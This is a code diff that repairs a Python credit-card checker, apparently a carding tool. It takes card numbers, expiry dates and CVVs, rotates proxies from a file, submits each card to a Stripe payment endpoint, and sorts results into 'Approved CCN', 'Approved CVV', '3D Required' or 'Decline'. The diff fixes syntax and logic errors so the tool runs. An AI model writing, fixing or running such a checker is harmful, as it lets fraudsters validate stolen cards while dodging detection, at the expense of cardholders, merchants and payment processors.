@@ -1,4 +1,4 @@
-import request
+import requests
 import random
 import json
 import time
@@ -11,8 +11,8 @@ def stripe(username, numero, mes, ano, cvv):
   proxyies = "proxy.txt"
   inicio = time.time()
   
-  with open(proxyies, 'r') as a file:
-    proxies_1 = file.read().splitLines()
+  with open(proxyies, 'r') as file:
+    proxies_1 = file.read().splitlines()
     
   session = requests.Session()
   proxie = random.choice(proxies_1)
@@ -92,41 +92,42 @@ def stripe(username, numero, mes, ano, cvv):
 
   }
   
-  final = session.get(url2, headers=h2, data=data).json()
+  final = session.post(url2, headers=h2, data=data).json()
   
   end = time.time()
   tiempo = str(inicio - end)[1:5]
   
   try:
-    r_final = final['status']
-    if final = "succeeded" in r_final:
+    rfinal = final['status']
+    if "succeeded" in rfinal:
       
       msg = "Approved! ✅"
       code = "Succeeded"
-    elif final = "requires_action" in r_final:
+    elif "requires_action" in rfinal:
       
       msg = "3D ⚠️"
       code = "3D Required"
     
-    except KeyError:
-      r_end = final['error']['message']
+  except KeyError:
+      rend = final['error']['message']
       
-      if "card_error_authentication_required" in r_end:
+      if "card_error_authentication_required" in rend:
         msg = "3D ⚠️"
         code = "3D Required"
         
-      elif "Your card's security code is incorrect." in r_end:
+      elif "Your card's security code is incorrect." in rend:
         
         msg = "Approved CCN! ✅"
-        code = r_end
+        code = rend
         
-      elif "Your card has insufficient funds" in r_end:
+      elif "Your card has insufficient funds" in rend:
         
         msg = "Approved CVV! ✅"
-        code = r_end
+        code = rend
+
       else:
         msg = "Decline! ❌"
-        code = r_end
+        code = rend
   
   return (
     f"⋄ ︱ CC: {numero}|{mes}|{ano}|{cvv}\n"
